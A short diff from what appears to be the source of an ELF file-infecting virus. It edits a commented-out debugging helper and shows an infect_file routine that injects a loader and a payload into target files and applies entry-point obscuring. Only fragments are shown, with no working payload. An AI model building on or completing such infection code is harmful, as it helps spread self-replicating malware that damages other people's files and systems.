@@ -40,9 +40,9 @@ static void	nice_with_gdb(t_info *info)
 {
 	size_t size;
 	size = info->file_size - (info->bss_size + PAYLOAD_SIZE);
-	(void)size;
+	size = size - info->begin_bss;
 
-	// ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->offset_payload, size);
+// 	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->offset_payload, size);
 }*/
 
 static void	patch_payload(t_info *info)
@@ -204,7 +204,7 @@ static void		infect_file(char *path)
 	if (find_text(&info) == 1)
 		goto end_fct;
 	inject_loader(&info);
-//	nice_with_gdb(&info);
+// 	nice_with_gdb(&info);
 	inject_payload(&info);
 	inject_end(&info);
 	epo_parsing(&info);
